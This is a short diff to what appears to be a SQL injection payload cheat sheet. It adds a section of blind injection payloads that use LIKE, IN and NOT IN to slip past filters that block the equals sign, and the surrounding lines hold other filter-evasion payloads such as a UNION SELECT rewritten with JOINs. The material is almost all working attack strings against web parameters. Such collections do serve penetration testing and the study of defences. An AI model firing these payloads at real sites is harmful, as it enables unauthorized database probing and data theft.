@@ -415,6 +415,14 @@ SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
+No Equal - bypass using LIKE/NOT IN/IN
+
+```sql
+?id=1 and substring(version(),1,1)like(5)
+?id=1 and substring(version(),1,1)not in(4,3)
+?id=1 and substring(version(),1,1)in(4,3)
+```
+
 Blacklist using keywords - bypass using uppercase/lowercase
 
 ```sql
